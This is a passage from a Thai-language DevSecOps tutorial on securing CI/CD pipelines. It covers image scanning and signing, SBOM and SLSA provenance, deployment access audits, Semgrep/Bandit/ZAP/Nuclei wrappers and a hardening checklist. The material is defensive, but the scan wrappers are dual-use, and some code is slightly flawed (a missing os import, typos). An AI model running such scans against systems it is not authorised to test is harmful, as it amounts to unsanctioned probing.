  --label "build.commit=$(git rev-parse HEAD)" \
  --label "build.date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  -t myapp:$(git rev-parse --short HEAD) .

# Stage 4: Scan image for vulnerabilities
echo "[*] Scanning image for vulnerabilities..."
trivy image --severity HIGH,CRITICAL \
  --exit-code 1 \
  myapp:$(git rev-parse --short HEAD)

# Scan secrets in image
echo "[*] Scanning for secrets in image..."
trivy image --scanners secret \
  myapp:$(git rev-parse --short HEAD)

# Stage 5: Sign image
echo "[*] Signing image..."
cosign sign --key cosign.key \
  myapp:$(git rev-parse --short HEAD)

# Stage 6: Verify signature before push
echo "[*] Verifying image signature..."
cosign verify --key cosign.pub \
  myapp:$(git rev-parse --short HEAD)

# Stage 7: Generate SBOM
echo "[*] Generating SBOM..."
syft myapp:$(git rev-parse --short HEAD) \
  -o spdx-json > sbom.json

# Attach SBOM to image
cosign attach sbom --sbom sbom.json \
  myapp:$(git rev-parse --short HEAD)

# Stage 8: Push to registry
echo "[*] Pushing to registry..."
docker push myapp:$(git rev-parse --short HEAD)

echo "[+] Pipeline complete!"
```

```python
import subprocess
import json
import os
from typing import Optional

class BuildPipelineSecurityGate:
    """
    Security gate สำหรับ container build pipeline
    """
    
    def __init__(self, fail_on_critical: bool = True, fail_on_high: bool = False):
        self.fail_on_critical = fail_on_critical
        self.fail_on_high = fail_on_high
        self.gate_passed = True
        self.findings = []
    
    def check_trivy_results(self, image: str) -> dict:
        """ตรวจสอบ Trivy results"""
        result = subprocess.run(
            ["trivy", "image", "--format", "json",
             "--severity", "HIGH,CRITICAL", image],
            capture_output=True, text=True
        )
        
        critical_count = 0
        high_count = 0
        
        if result.stdout:
            try:
                data = json.loads(result.stdout)
                for res in data.get("Results", []):
                    for vuln in res.get("Vulnerabilities", []):
                        if vuln.get("Severity") == "CRITICAL":
                            critical_count += 1
                        elif vuln.get("Severity") == "HIGH":
                            high_count += 1
            except Exception:
                pass
        
        gate_result = {
            "critical": critical_count,
            "high": high_count,
            "passed": True
        }
        
        if self.fail_on_critical and critical_count > 0:
            gate_result["passed"] = False
            gate_result["reason"] = f"Found {critical_count} CRITICAL vulnerabilities"
            self.gate_passed = False
        
        if self.fail_on_high and high_count > 0:
            gate_result["passed"] = False
            gate_result["reason"] = f"Found {high_count} HIGH vulnerabilities"
            self.gate_passed = False
        
        return gate_result
    
    def check_image_signature(self, image: str, public_key: str) -> dict:
        """ตรวจสอบ image signature"""
        result = subprocess.run(
            ["cosign", "verify", "--key", public_key, image],
            capture_output=True, text=True
        )
        
        signed = result.returncode == 0
        if not signed:
            self.gate_passed = False
        
        return {
            "signed": signed,
            "passed": signed,
            "output": result.stdout if signed else result.stderr
        }
    
    def check_no_root_user(self, dockerfile_path: str) -> dict:
        """ตรวจสอบว่าไม่ใช้ root user"""
        has_user = False
        is_root = False
        
        try:
            with open(dockerfile_path) as f:
                for line in f:
                    if line.strip().startswith("USER"):
                        has_user = True
                        if "root" in line.lower() or "0" in line.split()[-1]:
                            is_root = True
        except Exception:
            pass
        
        passed = has_user and not is_root
        if not passed:
            self.gate_passed = False
        
        return {
            "has_user": has_user,
            "is_root": is_root,
            "passed": passed
        }
    
    def run_all_gates(self, image: str, dockerfile: str, cosign_key: str = None) -> dict:
        """รันทุก security gates"""
        results = {}
        
        results["vulnerability_scan"] = self.check_trivy_results(image)
        results["root_user_check"] = self.check_no_root_user(dockerfile)
        
        if cosign_key:
            results["signature_check"] = self.check_image_signature(image, cosign_key)
        
        results["overall_passed"] = self.gate_passed
        
        return results


print("Build Pipeline Security Gate ready")
```

---

## Step 447: Artifact Security and Signing

### แนวคิด
การเซ็น artifacts และตรวจสอบ integrity ช่วยป้องกัน tampering และ supply chain attacks

```python
import hashlib
import subprocess
import json
import os
from datetime import datetime
from typing import Optional

class ArtifactSigner:
    """
    เซ็นและตรวจสอบความถูกต้องของ build artifacts
    """
    
    def calculate_hash(self, filepath: str, algorithm: str = "sha256") -> str:
        """คำนวณ hash ของไฟล์"""
        h = hashlib.new(algorithm)
        
        with open(filepath, 'rb') as f:
            while chunk := f.read(8192):
                h.update(chunk)
        
        return h.hexdigest()
    
    def generate_checksums(self, artifacts: list, output_file: str = "checksums.txt") -> dict:
        """สร้างไฟล์ checksums"""
        checksums = {}
        
        for artifact in artifacts:
            if os.path.exists(artifact):
                sha256 = self.calculate_hash(artifact, "sha256")
                sha512 = self.calculate_hash(artifact, "sha512")
                checksums[artifact] = {
                    "sha256": sha256,
                    "sha512": sha512,
                    "size": os.path.getsize(artifact),
                    "timestamp": datetime.utcnow().isoformat()
                }
        
        # เขียนลงไฟล์
        with open(output_file, 'w') as f:
            for artifact, hashes in checksums.items():
                f.write(f"{hashes['sha256']}  {artifact}\n")
        
        return checksums
    
    def sign_artifact(self, filepath: str, private_key: str) -> bool:
        """เซ็นไฟล์ด้วย GPG"""
        result = subprocess.run(
            ["gpg", "--detach-sign", "--armor",
             "--local-user", private_key, filepath],
            capture_output=True, text=True
        )
        return result.returncode == 0
    
    def verify_signature(self, filepath: str) -> dict:
        """ตรวจสอบลายเซ็น"""
        sig_file = filepath + ".asc"
        if not os.path.exists(sig_file):
            return {"verified": False, "error": "Signature file not found"}
        
        result = subprocess.run(
            ["gpg", "--verify", sig_file, filepath],
            capture_output=True, text=True
        )
        
        return {
            "verified": result.returncode == 0,
            "output": result.stderr  # GPG writes to stderr
        }
    
    def sign_with_cosign(self, image: str, key_file: str) -> dict:
        """เซ็น container image ด้วย cosign"""
        result = subprocess.run(
            ["cosign", "sign", "--key", key_file, image],
            capture_output=True, text=True
        )
        
        return {
            "success": result.returncode == 0,
            "output": result.stdout,
            "error": result.stderr
        }
    
    def generate_provenance(self, artifact: str, build_info: dict) -> dict:
        """สร้าง SLSA provenance metadata"""
        provenance = {
            "_type": "https://in-toto.io/Statement/v0.1",
            "subject": [{
                "name": os.path.basename(artifact),
                "digest": {
                    "sha256": self.calculate_hash(artifact)
                }
            }],
            "predicateType": "https://slsa.dev/provenance/v0.2",
            "predicate": {
                "builder": {
                    "id": build_info.get("builder_id", "unknown")
                },
                "buildType": build_info.get("build_type", "unknown"),
                "invocation": {
                    "configSource": {
                        "uri": build_info.get("repo_url", ""),
                        "digest": {
                            "sha1": build_info.get("commit_sha", "")
                        },
                        "entryPoint": build_info.get("entry_point", "")
                    }
                },
                "buildConfig": build_info.get("config", {}),
                "metadata": {
                    "buildStartedOn": build_info.get("start_time", ""),
                    "buildFinishedOn": build_info.get("end_time", ""),
                    "completeness": {
                        "parameters": False,
                        "environment": False,
                        "materials": False
                    },
                    "reproducible": False
                },
                "materials": build_info.get("materials", [])
            }
        }
        
        return provenance


SLSA_COMMANDS = """
# SLSA (Supply-chain Levels for Software Artifacts) Commands

# 1. ตรวจสอบ image signature ด้วย cosign
cosign verify --key cosign.pub IMAGE:TAG

# 2. ตรวจสอบ SBOM
cosign verify-attestation --type sbom IMAGE:TAG | \
  jq -r .payload | base64 -d | jq .

# 3. Generate keyless signing (Sigstore)
cosign sign IMAGE:TAG  # uses OIDC token

# 4. ตรวจสอบ provenance (SLSA)
slsa-verifier verify-image IMAGE:TAG \
  --source-uri github.com/ORG/REPO

# 5. in-toto attestation
in-toto-run \
  --name build \
  --signing-key build_key.pem \
  --materials src/ \
  --products dist/ \
  -- python3 setup.py build

# 6. ตรวจสอป checksums
sha256sum -c checksums.sha256

# 7. Sigstore Rekor - transparency log
rekor-cli upload \
  --artifact target.jar \
  --signature target.jar.sig \
  --pki-format pgp \
  --public-key pubkey.asc
"""

print(SLSA_COMMANDS)
```

---

## Step 448: Deployment Pipeline Access Control

### แนวคิด
การควบคุมการเข้าถึงและสิทธิ์ใน deployment pipeline ช่วยป้องกัน unauthorized deployments

```python
import subprocess
import json
from typing import Optional
import requests

class DeploymentAccessControl:
    """
    ตรวจสอบการควบคุมการเข้าถึง deployment pipeline
    """
    
    def audit_github_environments(self, token: str, owner: str, repo: str) -> list:
        """ตรวจสอบ GitHub Environments configuration"""
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        findings = []
        
        # Get environments
        resp = requests.get(
            f"https://api.github.com/repos/{owner}/{repo}/environments",
            headers=headers
        )
        
        if resp.status_code == 200:
            envs = resp.json().get("environments", [])
            for env in envs:
                env_name = env["name"]
                protection_rules = env.get("protection_rules", [])
                
                # Check if production has protection rules
                if env_name.lower() in ["production", "prod"]:
                    if not protection_rules:
                        findings.append({
                            "environment": env_name,
                            "issue": "Production environment has no protection rules",
                            "severity": "HIGH"
                        })
                    else:
                        has_required_reviewers = any(
                            r["type"] == "required_reviewers"
                            for r in protection_rules
                        )
                        if not has_required_reviewers:
                            findings.append({
                                "environment": env_name,
                                "issue": "No required reviewers for production",
                                "severity": "MEDIUM"
                            })
        
        return findings
    
    def check_service_account_permissions(self) -> list:
        """ตรวจสอบสิทธิ์ service account ที่ใช้ใน deployment"""
        # ตัวอย่างการตรวจสอบ IAM permissions
        findings = []
        
        EXCESSIVE_PERMISSIONS = [
            "s3:*", "ec2:*", "iam:*",
            "sts:AssumeRole", "lambda:*",
            "cloudformation:*"
        ]
        
        # เพิ่ม findings ถ้าพบ permissions เหล่านี้
        for perm in EXCESSIVE_PERMISSIONS:
            findings.append({
                "permission": perm,
                "note": "Check if deployment service account needs this",
                "recommendation": "Apply principle of least privilege"
            })
        
        return findings[:3]  # Return sample
    
    def validate_deployment_approvals(self, required_approvers: int = 2) -> dict:
        """ตรวจสอบการอนุมัติ deployment"""
        return {
            "required_approvers": required_approvers,
            "policy": "Require N approvals before deployment to production",
            "implementation": [
                "GitHub Environments with required reviewers",
                "CODEOWNERS file for automatic review requests",
                "Branch protection rules",
                "4-eyes principle for deployment"
            ]
        }


DEPLOYMENT_SECURITY = """
# Deployment Security Best Practices

# 1. GitHub Environments Protection
# Settings > Environments > Production
# - Required reviewers: 2+
# - Wait timer: 5 minutes
# - Deployment branches: main only
# - Required environment secrets

# 2. CODEOWNERS สำหรับ approval workflows
# .github/CODEOWNERS:
# * @security-team
# /deploy/ @ops-team @security-team

# 3. Workflow permissions แบบ minimal
# .github/workflows/deploy.yml:
permissions:
  id-token: write  # OIDC only
  contents: read

# 4. OIDC แทน long-lived credentials
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::ACCOUNT:role/GitHubActions
    aws-region: us-east-1

# 5. Environment separation
# - Development: no approval required
# - Staging: 1 approval
# - Production: 2 approvals + delay

# 6. Deployment audit logging
# Log all deployments with:
# - Who deployed
# - When
# - What commit
# - Which environment
"""

print(DEPLOYMENT_SECURITY)
```

---

## Step 449: Pipeline SAST and DAST Integration

### แนวคิด
การรวม Static Application Security Testing (SAST) และ Dynamic Application Security Testing (DAST) เข้าเป็นส่วนหนึ่งของ pipeline

```python
import subprocess
import json
import requests
from typing import Optional

class PipelineSecurityTesting:
    """
    รวม SAST/DAST เข้าใน CI/CD pipeline
    """
    
    def run_semgrep(self, code_path: str, config: str = "auto") -> dict:
        """รัน Semgrep SAST scan"""
        result = subprocess.run(
            ["semgrep", "--config", config,
             "--json", code_path],
            capture_output=True, text=True
        )
        
        if result.returncode in [0, 1]:  # 1 = findings found
            try:
                data = json.loads(result.stdout)
                findings = data.get("results", [])
                
                return {
                    "total": len(findings),
                    "by_severity": {
                        "error": sum(1 for f in findings if f.get("extra", {}).get("severity") == "ERROR"),
                        "warning": sum(1 for f in findings if f.get("extra", {}).get("severity") == "WARNING"),
                    },
                    "top_findings": [
                        {
                            "rule": f.get("check_id"),
                            "file": f.get("path"),
                            "line": f.get("start", {}).get("line"),
                            "message": f.get("extra", {}).get("message")
                        }
                        for f in findings[:10]
                    ]
                }
            except Exception:
                pass
        
        return {"error": result.stderr[:500]}
    
    def run_bandit(self, python_path: str) -> dict:
        """รัน Bandit Python security scan"""
        result = subprocess.run(
            ["bandit", "-r", python_path, "-f", "json",
             "-ll"],  # -ll = report only medium/high
            capture_output=True, text=True
        )
        
        if result.stdout:
            try:
                data = json.loads(result.stdout)
                results = data.get("results", [])
                metrics = data.get("metrics", {})
                
                return {
                    "total_issues": len(results),
                    "high_severity": sum(
                        1 for r in results
                        if r.get("issue_severity") == "HIGH"
                    ),
                    "metrics": metrics,
                    "top_findings": [
                        {
                            "test": r.get("test_id"),
                            "severity": r.get("issue_severity"),
                            "file": r.get("filename"),
                            "line": r.get("line_number"),
                            "issue": r.get("issue_text")
                        }
                        for r in results[:10]
                    ]
                }
            except Exception:
                pass
        
        return {"error": result.stderr[:500]}
    
    def run_owasp_zap_baseline(self, target_url: str, report_file: str = "zap_report.html") -> dict:
        """รัน OWASP ZAP baseline scan"""
        # ใช้ ZAP Docker image
        result = subprocess.run([
            "docker", "run", "--rm",
            "-v", f"{os.getcwd()}:/zap/wrk/:rw",
            "-t", "owasp/zap2docker-stable",
            "zap-baseline.py",
            "-t", target_url,
            "-r", "zap_report.html",
            "-J", "zap_report.json"
        ], capture_output=True, text=True)
        
        # Parse JSON report
        if os.path.exists("zap_report.json"):
            with open("zap_report.json") as f:
                data = json.load(f)
            
            alerts = data.get("site", [{}])[0].get("alerts", [])
            return {
                "total_alerts": len(alerts),
                "high_risk": sum(1 for a in alerts if a.get("riskcode") == "3"),
                "medium_risk": sum(1 for a in alerts if a.get("riskcode") == "2"),
            }
        
        return {"status": result.returncode, "output": result.stdout[:500]}
    
    def run_nuclei_dast(self, target: str, templates: str = "cves/") -> dict:
        """รัน Nuclei vulnerability scan"""
        result = subprocess.run(
            ["nuclei", "-target", target,
             "-t", templates,
             "-json-output", "/tmp/nuclei_results.json",
             "-severity", "high,critical"],
            capture_output=True, text=True
        )
        
        findings = []
        if os.path.exists("/tmp/nuclei_results.json"):
            with open("/tmp/nuclei_results.json") as f:
                for line in f:
                    if line.strip():
                        try:
                            findings.append(json.loads(line))
                        except Exception:
                            pass
        
        return {
            "total": len(findings),
            "critical": sum(1 for f in findings if f.get("info", {}).get("severity") == "critical"),
            "high": sum(1 for f in findings if f.get("info", {}).get("severity") == "high"),
        }


SAST_DAST_PIPELINE = """
# SAST/DAST in CI/CD Pipeline (GitHub Actions)

name: Security Testing Pipeline
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

jobs:
  sast:
    name: Static Security Analysis
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    
    # Semgrep
    - uses: returntocorp/semgrep-action@v1
      with:
        config: auto
        generateSarif: true
    
    # Bandit (Python)
    - name: Bandit scan
      run: |
        pip install bandit
        bandit -r . -f json -ll -o bandit.json || true
    
    # Upload results to Security tab
    - uses: github/codeql-action/upload-sarif@v2
      with:
        sarif_file: semgrep.sarif
  
  dast:
    name: Dynamic Security Testing
    runs-on: ubuntu-latest
    needs: [deploy-staging]
    steps:
    - name: OWASP ZAP Baseline
      uses: zaproxy/action-baseline@v0.10.0
      with:
        target: 'https://staging.example.com'
        rules_file_name: '.zap/rules.tsv'
        cmd_options: '-a'
    
    # Nuclei scan
    - name: Nuclei scan
      uses: projectdiscovery/nuclei-action@main
      with:
        target: 'https://staging.example.com'
        templates: 'cves/,misconfiguration/'
"""

print(SAST_DAST_PIPELINE)
```

---

## Step 450: CI/CD Security Hardening Checklist

### แนวคิด
การสรุปสิ่งที่ต้องทำเพื่อเสริมความปลอดภัยใน CI/CD pipeline

```python
class CICDSecurityChecklist:
    """
    CI/CD Security Hardening Checklist
    """
    
    CHECKLIST = {
        "Source Control": [
            "Enable branch protection on main/master",
            "Require pull request reviews (minimum 2)",
            "Enable signed commits",
            "Restrict force pushes",
            "Add CODEOWNERS file",
            "Enable secret scanning alerts",
            "Enable Dependabot security alerts",
        ],
        "Credentials Management": [
            "No hardcoded secrets in code",
            "Use secrets manager (AWS Secrets Manager, HashiCorp Vault)",
            "Rotate credentials regularly",
            "Use short-lived tokens (OIDC) instead of long-lived credentials",
            "Apply principle of least privilege to CI credentials",
            "Audit all credentials with access to pipeline",
        ],
        "Pipeline Configuration": [
            "Pin all action versions with SHA hashes",
            "Restrict workflow permissions (contents: read only)",
            "Use pull_request not pull_request_target for fork PRs",
            "Sanitize untrusted input before using in scripts",
            "Enable audit logging for pipeline runs",
            "Require approval for production deployments",
        ],
        "Build Security": [
            "Scan code with SAST tool (Semgrep, CodeQL)",
            "Scan dependencies for vulnerabilities",
            "Scan container images with Trivy/Grype",
            "Sign container images with Cosign",
            "Generate and store SBOM",
            "Verify image signatures before deployment",
        ],
        "Runtime Security": [
            "Use isolated build environments",
            "Restrict network access from build agents",
            "Clean workspace after each build",
            "Run containers as non-root",
            "Implement resource limits on build agents",
            "Monitor pipeline for anomalous behavior",
        ],
        "Deployment Security": [
            "Separate deployment credentials per environment",
            "Implement change management process",
            "Require approval gates for production",
            "Test in staging before production",
            "Implement rollback procedures",
            "Log all deployments with full context",
        ]
    }
    
    def generate_checklist_report(self) -> str:
        report = ["=" * 70]
        report.append("CI/CD PIPELINE SECURITY HARDENING CHECKLIST")
        report.append("=" * 70)
        
        total = 0
        for category, items in self.CHECKLIST.items():
            report.append(f"\n## {category}")
            for item in items:
                report.append(f"  [ ] {item}")
                total += 1
        
        report.append(f"\nTotal items: {total}")
        return "\n".join(report)
    
    def assess_current_state(self, answers: dict) -> dict:
        """ประเมิน maturity level ของ CI/CD security"""
        total = sum(len(items) for items in self.CHECKLIST.values())
        passed = sum(1 for v in answers.values() if v)
        
        score = (passed / total) * 100 if total > 0 else 0
        
        maturity = (
            "Initial" if score < 25 else
            "Developing" if score < 50 else
            "Defined" if score < 75 else
            "Managed" if score < 90 else
            "Optimizing"
        )
        
        return {
            "score": round(score, 1),
            "passed": passed,
            "total": total,
            "maturity_level": maturity
        }


if __name__ == "__main__":
    checklist = CICDSecurityChecklist()
    print(checklist.generate_checklist_report())
    
    # สรุป tools ที่แนะนำ
    print("""
# CI/CD Security Tools Summary

SAST:
  - Semgrep (multi-language)
  - CodeQL (GitHub)
  - Bandit (Python)
  - SonarQube (enterprise)
  
DAMAST:
  - OWASP ZAP
  - Nuclei
  - Nikto

Secrets Scanning:
  - Gitleaks
  - TruffleHog
  - GitGuardian
  
Dependency Scanning:
  - Dependabot
  - Renovate
  - npm audit
  - safety (Python)
  - OWASP Dependency-Check
  
Container Scanning:
  - Trivy
  - Grype
  - Anchore
  - Snyk Container
  
IaC Scanning:
  - Checkov
  - tfsec
  - Terrascan
  - KICS
  
Supply Chain:
  - Cosign (signing)
  - Syft (SBOM)
  - SLSA framework
  - in-toto
""")
```

---

## สรุป Part 45

ในส่วนนี้ได้เรียนรู้:

1. **GitHub Actions Security** - การตรวจสอบและป้องกัน workflow vulnerabilities
2. **Jenkins Assessment** - การตรวจสอบ Jenkins และใช้ประโยชน์จากช่องโหว่
3. **Secrets Management** - การตรวจสอบและป้องกัน secrets leaks
4. **Supply Chain Security** - การป้องกัน supply chain attacks
5. **IaC Security** - การสแกน Terraform/CloudFormation
6. **Build Pipeline** - Secure container build pipeline
7. **Artifact Signing** - การเซ็นและตรวจสอบ artifacts
8. **Deployment Access Control** - การควบคุมการเข้าถึง deployments
9. **SAST/DAST Integration** - การรวม security testing เข้าใน pipeline
10. **Security Checklist** - รายการครอบคลุม CI/CD security
